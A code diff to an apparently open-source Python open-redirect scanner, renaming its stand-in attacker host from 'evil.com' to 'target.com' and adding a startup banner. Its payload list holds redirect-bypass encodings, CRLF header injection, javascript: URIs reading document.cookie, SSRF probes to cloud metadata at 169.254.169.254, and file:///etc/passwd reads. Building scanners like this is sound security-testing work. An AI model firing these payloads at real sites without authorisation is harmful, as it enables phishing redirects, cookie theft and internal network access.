@@ -69,78 +69,78 @@ REDIRECT_PARAMS = [
 
 # Test payloads
 PAYLOADS = [
-    "https://evil.com",
-    "http://evil.com",
+    "https://target.com",
+    "http://target.com",
     "https://malicious.example.com",
     "http://malicious.example.com",
-    "/evil.com",
+    "/target.com",
     "malicious.example.com",
-    "//evil.com",
+    "//target.com",
     "//malicious.example.com",
-    "//evil.com",
+    "//target.com",
     "//malicious.example.com",
-    "\\\\evil.com",
+    "\\\\target.com",
     "\\\\malicious.example.com",
-    "%2F%2Fevil.com",
+    "%2F%2Ftarget.com",
     "%2F%2Fmalicious.example.com",
-    "%5C%5Cevil.com",
+    "%5C%5Ctarget.com",
     "%5C%5Cmalicious.example.com",
-    "/%2F%2Fevil.com",
+    "/%2F%2Ftarget.com",
     "/%2F%2Fmalicious.example.com",
-    "/%5C%5Cevil.com",
+    "/%5C%5Ctarget.com",
     "/%5C%5Cmalicious.example.com",
-    "%252F%252Fevil.com",
+    "%252F%252Ftarget.com",
     "%252F%252Fmalicious.example.com",
-    "%255C%255Cevil.com",
+    "%255C%255Ctarget.com",
     "%255C%255Cmalicious.example.com",
-    "https:evil.com",
-    "http:evil.com",
-    "https://evil.com",
-    "http://evil.com",
-    "https:\\evil.com",
-    "http:\\evil.com",
-    "https:/evil.com",
-    "http:/evil.com",
-    "%0D%0Ahttp://evil.com",
-    "%0D%0Ahttps://evil.com",
-    "%09//evil.com",
-    "/%09/evil.com",
-    "/%5Cevil.com",
-    "//%0D%0Aevil.com",
-    "/%2F%2Fevil.com",
-    "/%5C%5Cevil.com",
-    "/evil.com",
-    ".evil.com",
+    "https:target.com",
+    "http:target.com",
+    "https://target.com",
+    "http://target.com",
+    "https:\\target.com",
+    "http:\\target.com",
+    "https:/target.com",
+    "http:/target.com",
+    "%0D%0Ahttp://target.com",
+    "%0D%0Ahttps://target.com",
+    "%09//target.com",
+    "/%09/target.com",
+    "/%5Ctarget.com",
+    "//%0D%0Atarget.com",
+    "/%2F%2Ftarget.com",
+    "/%5C%5Ctarget.com",
+    "/target.com",
+    ".target.com",
     "javascript:alert(document.domain)",
     "javascript:alert('XSS')",
-    "javascript://evil.com",
+    "javascript://target.com",
     "javascript://%0aalert(document.cookie)",
     "javascript://%0Aalert(document.cookie)",
-    "data:text/html,<script>window.location='https://evil.com'</script>",
-    "%0d%0aLocation:https://evil.com",
+    "data:text/html,<script>window.location='https://target.com'</script>",
+    "%0d%0aLocation:https://target.com",
     "%0d%0aSet-Cookie:sessionid=123",
-    "%0D%0ALocation:%20https://evil.com",
+    "%0D%0ALocation:%20https://target.com",
     "%0D%0ASet-Cookie:%20admin=true",
-    "https://evil.com@legitimate-site.com",
-    "https://legitimate-site.com.evil.com",
-    "https://legitimate-site.com%40evil.com",
-    "https://legitimate-site.com%2F%2Fevil.com",
-    "https://evil.com%00https://legitimate-site.com",
-    "https://evil.com%2500https://legitimate-site.com",
-    "https://evil.com#https://legitimate-site.com",
-    "//evil.com",
-    "////evil.com",
-    "///@evil.com",
-    "//evil.com/",
-    "//evil.com/",
-    "\\evil.com",
-    "\/evil.com",
-    "/.evil.com",
-    "/..evil.com",
-    "evil.com/",
-    "evil.com//",
-    "evil.com/.",
-    "evil.com/..",
+    "https://target.com@legitimate-site.com",
+    "https://legitimate-site.com.target.com",
+    "https://legitimate-site.com%40target.com",
+    "https://legitimate-site.com%2F%2Ftarget.com",
+    "https://target.com%00https://legitimate-site.com",
+    "https://target.com%2500https://legitimate-site.com",
+    "https://target.com#https://legitimate-site.com",
+    "//target.com",
+    "////target.com",
+    "///@target.com",
+    "//target.com/",
+    "//target.com/",
+    "\\target.com",
+    "\/target.com",
+    "/.target.com",
+    "/..target.com",
+    "target.com/",
+    "target.com//",
+    "target.com/.",
+    "target.com/..",
     "http://127.0.0.1",
     "https://127.0.0.1",
     "//127.0.0.1",
@@ -154,21 +154,21 @@ PAYLOADS = [
     "https://169.254.169.254",
     "//169.254.169.254",
     "file:///etc/passwd",
-    "file://evil.com/etc/passwd",
-    "ftp://evil.com",
-    "ftps://evil.com",
-    "sftp://evil.com",
-    "ldap://evil.com",
-    "ldaps://evil.com",
-    "gopher://evil.com",
-    "dict://evil.com",
-    "../evil.com",
-    "../../evil.com",
-    "../../../evil.com",
-    "..%2Fevil.com",
-    "..%252Fevil.com",
-    "....//evil.com",
-    "..../evil.com"
+    "file://target.com/etc/passwd",
+    "ftp://target.com",
+    "ftps://target.com",
+    "sftp://target.com",
+    "ldap://target.com",
+    "ldaps://target.com",
+    "gopher://target.com",
+    "dict://target.com",
+    "../target.com",
+    "../../target.com",
+    "../../../target.com",
+    "..%2Ftarget.com",
+    "..%252Ftarget.com",
+    "....//target.com",
+    "..../target.com"
 ]
 
 USER_AGENTS = [
@@ -178,6 +178,18 @@ USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:132.0) Gecko/20100101 Firefox/132.0"
 ]
+
+# Banner function
+def print_banner():
+    print(f"""
+{CYAN}  
+  ____                ___         ___             __ 
+ / __ \___  ___ ___  / _ \___ ___/ (_)______ ____/ /_
+/ /_/ / _ \/ -_) _ \/ , _/ -_) _  / / __/ -_) __/ __/
+\____/ .__/\__/_//_/_/|_|\__/\_,_/_/_/  \__/\__/\__/ 
+    /_/                                              
+{BLUE}  Open Redirect Scanner | ibrahimsql | {CURRENT_DATE} {CURRENT_TIME}{NC}
+    """)
 
 def signal_handler(sig, frame):
     """Handle Ctrl+C gracefully"""
@@ -276,7 +288,7 @@ def analyze_redirect(response, payload):
         return False, "Empty location header"
     
     payload_indicators = [
-        'evil.com',
+        'target.com',
         'malicious.example.com',
         '127.0.0.1',
         '192.168.1.1',
@@ -445,7 +457,7 @@ def save_results(results, output_format='all'):
                         'total_vulnerabilities': len(results)
                     },
                     'vulnerabilities': results
-                }, f, indent=2, ensure_ascii=False)
+                }, f, indent=2)
             
             print_success(f"Results saved to: {json_file}")
         except Exception as e:
@@ -476,6 +488,9 @@ def save_results(results, output_format='all'):
 
 def main():
     """Main function"""
+    # Display banner
+    print_banner()
+    
     parser = argparse.ArgumentParser(
         description="Simple Open Redirect Scanner",
         formatter_class=argparse.RawDescriptionHelpFormatter,
